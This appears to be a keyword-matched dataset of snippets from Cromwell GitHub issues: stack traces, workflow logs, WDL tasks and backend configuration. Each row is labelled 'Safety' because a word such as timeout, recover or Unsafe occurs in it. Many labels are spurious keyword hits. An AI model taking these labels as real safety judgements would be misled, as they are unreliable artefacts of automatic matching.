akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akk",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3774:21335,recover,recoverWith,21335,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3774,1,['recover'],['recoverWith']
Safety,"/gatk4:4.1.0.0--0""; }. command {; set -e; mkdir -p $(dirname ~{outputBam}); gatk --java-options -Xmx~{memory}G \; SplitNCigarReads \; -I ~{inputBam} \; -R ~{referenceFasta} \; -O ~{outputBam} \; ~{prefix('-L ', intervals)}; }. output {; File bam = outputBam; File bamIndex = sub(outputBam, ""\.bam$"", "".bai""); }. runtime {; docker: dockerImage; memory: ceil(memory * memoryMultiplier); }; }; ```; expected behavior: By default nothing happens as intervals is empty. So this should evaluate to an empty string. No intervals flag is passed to GATK.; Actual behaviour:; ```; [2019-07-29 08:49:39,27] [error] WorkflowManagerActor Workflow 3de3bd74-b387-4d35-a704-73a4054387e9 failed (during ExecutingWorkflowState): cromwell.core.CromwellFatalException: java.lang.Exception: Failed command instantiation; at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:47); at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:38); at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.fo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5092:1274,recover,recoverWith,1274,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5092,1,['recover'],['recoverWith']
Safety,"/tmp/xxxxxx.sh && chmod u+x /tmp/xxxxxx.sh; && sh /tmp/xxxxxx.sh; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; tag: Localization; mounts:; - disk: local-disk; path: /cromwell_root; - commands:; - -c; - printf '%s %s\n' ""$(date -u '+%Y/%m/%d %H:%M:%S')"" Done\ localization.; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; logging: Localization; timeout: 300s; - commands:; - -c; - printf '%s %s\n' ""$(date -u '+%Y/%m/%d %H:%M:%S')"" Running\ user\ action:\; docker\ run\ -v\ /mnt/local-disk:/cromwell_root\ --entrypoint\=/bin/bash\; ubuntu@sha256:1e48201ccc2ab83afc435394b3bf70af0fa0055215c1e26a5da9b50a1ae367c9\; /cromwell_root/script; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; logging: UserAction; timeout: 300s; - commands:; - /cromwell_root/script; entrypoint: /bin/bash; imageUri: ubuntu@sha256:1e48201ccc2ab83afc435394b3bf70af0fa0055215c1e26a5da9b50a1ae367c9; labels:; tag: UserAction; mounts:; - disk: local-disk; path: /cromwell_root; - commands:; - -c; - printf '%s %s\n' ""$(date -u '+%Y/%m/%d %H:%M:%S')"" Starting\ delocalization.; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; logging: Delocalization; timeout: 300s; - commands:; - -c; - /bin/bash /cromwell_root/gcs_delocalization.sh; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; tag: Delocalization; mounts:; - disk: local-disk; path: /cromwell_root; - commands:; - -c; - printf '%s %s\n' ""$(date -u '+%Y/%m/%d %H:%M:%S')"" Done\ delocalization.; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; logging: Delocalization; timeout: 300s; - alwaysRun: true; commands:; - -c; - python -c 'import base64; print(base64.b64decode(""xxxxxx""));'; > /tmp/1xxxxxx.sh && chmod u+x /tmp/1xxxxxx.sh; && sh /tmp/1xxxxxx.sh; entrypoint: /bin/sh; imageUri: gcr.i",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6462:19424,timeout,timeout,19424,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6462,1,['timeout'],['timeout']
Safety,"/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce_read.py"", line 50, in ReadNoProxy; > request, timeout=timeout_property).read(); > File ""/usr/lib/python2.7/urllib2.py"", line 401, in open; > response = self._open(req, data); > File ""/usr/lib/python2.7/urllib2.py"", line 419, in _open; > '_open', req); > File ""/usr/lib/python2.7/urllib2.py"", line 379, in _call_chain; > result = func(*args); > File ""/usr/lib/python2.7/urllib2.py"", line 1211, in http_open; > return self.do_open(httplib.HTTPConnection, req); > File ""/usr/lib/python2.7/urllib2.py"", line 1184, in do_open; > r = h.getresponse(buffering=True); > File ""/usr/lib/python2.7/httplib.py"", line 1072, in getresponse; > response.begin(); > File ""/usr/lib/python2.7/httplib.py"", line 408, in begin; > version, status, reason = self._read_status(); > File ""/usr/lib/python2.7/httplib.py"", line 366, in _read_status; > line = self.fp.readline(); > File ""/usr/lib/python2.7/socket.py"", line 447, in readline; > data = self._sock.recv(self._rbufsize); > socket.timeout: timed out; > :; >; > This is a gsutil stacktrace. JES tried to copy the logs and failed, hence; > failing the job and the workflow. They might want to retry this - although; > we've been telling them to stop retrying too much on some things so I don't; > know. @geoffjentry <https://github.com/geoffjentry> and @cjllanwarne; > <https://github.com/cjllanwarne> were talking about it on slack maybe; > they have an opinion.; >; > For call caching: it will get slower and slower. Basically the more jobs; > you run the slower it's going to be... I'm working on something to fix that; > but it's not in develop yet.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298751846>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk6vHuB6D3iMODjERjQgj6h_SG4z2ks5r15JkgaJpZM4NNP8f>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298887027:3697,timeout,timeout,3697,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298887027,1,['timeout'],['timeout']
Safety,"0.4 is the latest release... according to github... (Yes, I realize that there have been tags since, but in the past, I had; been told to avoid these). On Tue, Jan 10, 2017 at 4:24 PM, Thib <notifications@github.com> wrote:. > It's expected that wdltool 0.4 will not validate this as the String; > main_output = hello_and_goodbye.hello_output syntax in workflow outputs; > was introduced specifically for sub workflows which wdltool 0.4 pre-dates.; > Try to update to the latest version of wdltool and it should validate.; >; > —; > You are receiving this because you authored the thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/1837#issuecomment-271702261>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk2mhGzhFvb8rAvqTnkXnmX_L-KYAks5rQ_bwgaJpZM4Lf57n>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 7003EB; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1837#issuecomment-271704642:138,avoid,avoid,138,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1837#issuecomment-271704642,1,['avoid'],['avoid']
Safety,"00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""db-2"" #28 daemon prio=5 os_prio=31 tid=0x00007fb7708d7800 nid=0x7d03 waiting on condition [0x000000012c789000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""pool-1-thread-1"" #27 prio=5 os_prio=31 tid=0x00007fb76f4b6000 nid=0x7b03 waiting on condition [0x000000012b643000]; java.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:38534,Unsafe,Unsafe,38534,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""db-3"" #29 daemon prio=5 os_prio=31 tid=0x00007fb76f4b7000 nid=0x7f03 waiting on condition [0x000000012c88c000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""db-2"" #28 daemon prio=5 os_prio=31 tid=0x00007fb7708d7800 nid=0x7d03 waiting on condition [0x000000012c789000]; java.lang",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:37484,Unsafe,Unsafe,37484,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"0006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""pool-1-thread-1"" #27 prio=5 os_prio=31 tid=0x00007fb76f4b6000 nid=0x7b03 waiting on condition [0x000000012b643000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""db-1"" #26 daemon prio=5 os_prio=31 tid=0x00007fb76b442000 nid=0x7903 waiting on condition [0x000000012d905000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.u",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:39588,Unsafe,Unsafe,39588,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"01, in _GetProperty; > value = _GetPropertyWithoutDefault(prop, properties_file); > File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py"", line 1539, in _GetPropertyWithoutDefault; > value = callback(); > File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py"", line 693, in _GetGCEProject; > return c_gce.Metadata().Project(); > File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py"", line 104, in Project; > gce_read.GOOGLE_GCE_METADATA_PROJECT_URI); > File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/util/retry.py"", line 155, in TryFunc; > return func(*args, **kwargs), None; > File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py"", line 41, in _ReadNoProxyWithCleanFailures; > return gce_read.ReadNoProxy(uri); > File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce_read.py"", line 50, in ReadNoProxy; > request, timeout=timeout_property).read(); > File ""/usr/lib/python2.7/urllib2.py"", line 401, in open; > response = self._open(req, data); > File ""/usr/lib/python2.7/urllib2.py"", line 419, in _open; > '_open', req); > File ""/usr/lib/python2.7/urllib2.py"", line 379, in _call_chain; > result = func(*args); > File ""/usr/lib/python2.7/urllib2.py"", line 1211, in http_open; > return self.do_open(httplib.HTTPConnection, req); > File ""/usr/lib/python2.7/urllib2.py"", line 1184, in do_open; > r = h.getresponse(buffering=True); > File ""/usr/lib/python2.7/httplib.py"", line 1072, in getresponse; > response.begin(); > File ""/usr/lib/python2.7/httplib.py"", line 408, in begin; > version, status, reason = self._read_status(); > File ""/usr/lib/python2.7/httplib.py"", line 366, in _read_status; > line = self.fp.readline(); > File ""/usr/lib/python2.7/socket.py"", line 447, in readline; > data = self._sock.recv(self._rbufsize); > socket.timeout: timed out; > :; >; > This is a gsutil stacktrace. JES tried to cop",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298887027:2779,timeout,timeout,2779,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298887027,1,['timeout'],['timeout']
Safety,"1. Oops, yes, I meant `exit-code-timeout-seconds`. ; 2. I think that the `unrelated to this timeout` side note is no longer accurate - the polling actually happens at the exact interval of the timeout now!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4877#issuecomment-486221911:33,timeout,timeout-seconds,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4877#issuecomment-486221911,3,['timeout'],"['timeout', 'timeout-seconds']"
Safety,"12/232939192-8823373b-c21e-4586-8c1b-516770a212e3.png"">. Because Job Manager breaks on large scatters, and to save money on compute credits, I decided to stop the workflow early rather than let it keep going to find out if the workflow log would eventually show an errors. So far, it seems to have considered everything a success. ```; 2023-04-18 21:59:54,599 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:108:1]: Status change from Running to Success; 2023-04-18 22:00:09,060 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:107:1]: Status change from Running to Success; 2023-04-18 22:00:18,464 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:106:1]: Status change from Running to Success; 2023-04-18 22:01:20,604 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:111:1]: Status change from Running to Success; 2023-04-18 22:14:47,728 INFO - WorkflowExecutionActor-10fa31a8-acbe-4ab7-a96a-6550ec08df12 [UUID(10fa31a8)]: Aborting workflow; 2023-04-18 22:14:47,729 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:262:1]: PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8):myco.pull:262:1] Aborted StandardAsyncJob(projects/16371921765/locations/us-central1/operations/9178938377659283430); 2023-04-18 22:14:47,729 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:112:1]: PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8):myco.pull:112:1] Aborted StandardAsyncJob(projects/16371921765/locations/us-central1/operations/8559201934542591362); 2023-04-18 22:14:48,295 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:262:1]: Successfully requested cancellation of projects/16371921765/locations/us-central1/operations/9178938377659283430; 2023-04-18 22:15:56,564 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:112:1]: Status change from Running to Success; 2023-04-18 22:16:44,505 INFO",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7121:4737,Abort,Aborting,4737,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7121,1,['Abort'],['Aborting']
Safety,"153039990-0d0b2c96-a33b-454f-9617-aee83137337a.PNG); [Cromwell-Error.docx](https://github.com/broadinstitute/cromwell/files/8026009/Cromwell-Error.docx); ; <!-- Paste/Attach your workflow if possible: -->; java -Dconfig.file=aws-cromwell-batch.conf -jar cromwell-75.jar run hello.wdl -i hello.inputs. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; include required(classpath(""application"")). aws {. application-name = ""cromwell""; auths = [; {; name = ""default""; scheme = ""default""; }; ]; region = ""us-east-1""; }; engine {; filesystems {; s3.auth = ""default""; }; }; call-caching {; enabled = true; invalidate-bad-cache-results = true; }; docker {; hash-lookup {; enabled = false; # How should docker hashes be looked up. Possible values are ""local"" and ""remote""; # ""local"": Lookup hashes on the local docker daemon using the cli; # ""remote"": Lookup hashes on docker hub and gcr; method = ""remote""; }; }. backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; numSubmitAttempts = 10; numCreateDefinitionAttempts = 10; concurrent-job-limit = 1000; root = ""s3://cromwell-aws-hello/cromwell-execution""; auth = ""default""; default-runtime-attributes {; queueArn = ""arn:aws:batch:us-east-1:XXXXXXXXX:job-queue/python-batch"" ,; scriptBucketName = ""cromwell-aws-hello"" ; }; filesystems {; s3 {; auth = ""default""; }; }; # Emit a warning if jobs last longer than this amount of time. This might indicate that something got stuck in the cloud.; slow-job-warning-time: 24 hours; }; }; }; }. [Cromwell-Error.docx](https://github.com/broadinstitute/cromwell/files/8026013/Cromwell-Error.docx); ![AWS-Batch](https://user-images.githubusercontent.com/25282254/153040332-625cb61a-062b-4766-96ea-8e129efb2b20.PNG); [config file.docx](https://github.com/broadinstitute/cromwell/files/8026025/config.file.docx). How to give Timeout options for Job definitions?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6671:3332,Timeout,Timeout,3332,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6671,1,['Timeout'],['Timeout']
Safety,190); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.reconnectToExistingJob(SharedFileSystemAsyncJobExecutionActor.scala:171); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.recover(SharedFileSystemAsyncJobExecutionActor.scala:159); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.recover$(SharedFileSystemAsyncJobExecutionActor.scala:159); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.recover(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:305); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:305); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:305); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.recoverAsync(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:574); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:569); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:37); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover(AsyncBackendJobExecutionActor.scala:65); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala:88); ,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2963:2266,recover,recoverAsync,2266,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2963,1,['recover'],['recoverAsync']
Safety,"2 other minor things popped up while call caching the 10K joint genotyping: ; - We spend a fair amount of time creating `GcsPathBuilder`s, which we shouldn't since we only need one per workflow in theory. In practice we need to create a few more because we can't quite propagate the same one around everywhere. But before this PR we would create one per job which seems inefficient. One reason for this is that `JobPaths` extends `WorkflowPaths`, so when we convert the latter to the former we effectively re-instantiate a new `WorkflowPaths` every time. This PR changes that so that `JobPaths` takes a `WorkflowPaths` instead as one of its attribute to avoid unnecessary re-allocations.; - A small optimization to the execution store which allows quicker lookup of ""Done"" jobs which we do a lot in `runnableCalls`. Also added a benchmark test that measures the performance of `runnableCalls`. Below are the results before and after this change. The ""size"" corresponds to how many jobs in ""Done"" and ""NotStarted"" states are inserted in the execution store before calling `runnableCalls`. Results are in ms. Before:; ![screen shot 2017-04-19 at 3 24 15 pm](https://cloud.githubusercontent.com/assets/2978948/25305440/fcca5418-2748-11e7-8d2a-6f2c645f2ef3.png). After:; ![screen shot 2017-04-19 at 3 25 18 pm](https://cloud.githubusercontent.com/assets/2978948/25305444/06de3f00-2749-11e7-860f-a1c077f3243f.png)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2198:654,avoid,avoid,654,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2198,1,['avoid'],['avoid']
Safety,"2/call-lo; ad_shared_covars/execution/stderr.; [First 3000 bytes]:Traceback (most recent call last):; File ""/home/cromwell-executions/main/9e4f5894-f7e6-4e2f-be4b-f547d6de7fff/call-main/main/788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2/call-load_shared_covars/inputs/-915037270/load_shared_covars.py"",; line 87, in <module>; load_covars(); File ""/home/cromwell-executions/main/9e4f5894-f7e6-4e2f-be4b-f547d6de7fff/call-main/main/788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2/call-load_shared_covars/inputs/-915037270/load_shared_covars.py"",; line 51, in load_covars; assert not np.any(np.isnan(data)); AssertionError. [2022-12-15 21:28:38,49] [info] WorkflowManagerActor: Workflow actor for 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff completed with status 'Failed'. The workflow will be removed from the workflow store.; [2022-12-15 21:28:52,23] [info] SingleWorkflowRunnerActor workflow finished with status 'Failed'.; [2022-12-15 21:28:53,46] [info] Workflow polling stopped; [2022-12-15 21:28:53,46] [info] Shutting down WorkflowStoreActor - Timeout = 5 seconds; [2022-12-15 21:28:53,46] [info] Aborting all running workflows.; [2022-12-15 21:28:53,46] [info] 0 workflows released by cromid-b254006; [2022-12-15 21:28:53,47] [info] WorkflowStoreActor stopped; [2022-12-15 21:28:53,47] [info] Shutting down WorkflowLogCopyRouter - Timeout = 5 seconds; [2022-12-15 21:28:53,47] [info] WorkflowLogCopyRouter stopped; [2022-12-15 21:28:53,47] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2022-12-15 21:28:53,47] [info] JobExecutionTokenDispenser stopped; [2022-12-15 21:28:53,47] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2022-12-15 21:28:53,47] [info] WorkflowManagerActor: All workflows finished; [2022-12-15 21:28:53,47] [info] WorkflowManagerActor stopped; [2022-12-15 21:28:53,71] [info] Connection pools shut down; [2022-12-15 21:28:53,71] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2022-12-15 21:28:53,71] [info] Shutting down JobStoreAc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:49166,Timeout,Timeout,49166,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,2,"['Abort', 'Timeout']","['Aborting', 'Timeout']"
Safety,200 files scattered 200x fails to call cache due to GCS hash timeout,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4873:61,timeout,timeout,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4873,1,['timeout'],['timeout']
Safety,"2018-06-13 14:29:44,774 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; 2018-06-13 14:29:45,255 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - MaterializeWorkflowDescriptorActor [UUID(a67833cb)]: Parsing workflow as WDL draft-2; 2018-06-13 14:29:46,004 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - MaterializeWorkflowDescriptorActor [UUID(a67833cb)]: Call-to-Backend assignments: demux_only.illumina_demux -> AWSBATCH; 2018-06-13 14:29:46,085 cromwell-system-akka.dispatchers.backend-dispatcher-91 WARN - AWSBATCH [UUID(a67833cb)]: Key/s [preemptible, dx_instance_type] is/are not supported by backend. Unsupported attributes will not be part of job executions.; 2018-06-13 14:29:47,088 cromwell-system-akka.dispatchers.backend-dispatcher-91 WARN - Localhost hostname lookup failed, keeping the value 'unavailable'; java.util.concurrent.TimeoutException: null; 	at java.util.concurrent.FutureTask.get(FutureTask.java:205); 	at com.getsentry.raven.event.EventBuilder$HostnameCache.updateCache(EventBuilder.java:491); 	at 